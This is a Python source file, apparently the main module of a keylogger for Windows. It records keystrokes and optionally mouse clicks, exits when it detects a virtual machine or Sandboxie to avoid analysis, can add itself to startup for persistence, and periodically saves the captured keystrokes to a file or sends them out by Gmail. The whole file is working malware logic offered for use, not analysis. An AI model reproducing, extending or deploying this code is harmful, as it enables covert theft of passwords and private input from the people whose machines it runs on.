import sys, os, time

sys.path.append(os.pardir)

from src import persistence, Tools
from src import exporter
from src.keylogger import keylogger

PATH = os.path.realpath(sys.argv[0])
APPDATA = os.environ["APPDATA"]


class main:
    def __init__(self, timer, export_path="", add_to_startup=False, log_clicks=False, check_vm=False, check_sandboxie=False):
        if persistence.instance_running(): sys.exit(0)
        if check_vm and persistence.detect_vm(): sys.exit(0)
        if check_sandboxie and persistence.detect_sandboxie(): sys.exit(0)
        if add_to_startup: persistence.add_to_startup(APPDATA, PATH)

        self.gmail = ""
        self.gmail_pass = ""

        self.timer = timer
        self.export_path = Tools.get_env_var(export_path)

        self.current_file_path = os.path.realpath(sys.argv[0])

        self.keylogger = keylogger(log_clicks)

    def override_gmail(self, gmail, gmail_pass):
        self.gmail = gmail
        self.gmail_pass = gmail_pass

    def start(self):
        self.keylogger.start()

        while True:
            time.sleep(self.timer)

            if not self.keylogger.keylogger_running: break

            key_log = self.keylogger.get_key_log()

            if key_log != "":
                if self.gmail == "":
                    if exporter.save_text_locally(key_log, self.export_path):
                        self.keylogger.clear_key_log()
                else:
                    if exporter.send_gmail(key_log, self.gmail, self.gmail_pass):
                        self.keylogger.clear_key_log()


if __name__ == "__main__": main = main(60, "%userprofile%\log.txt", False, False, False, False);main.start()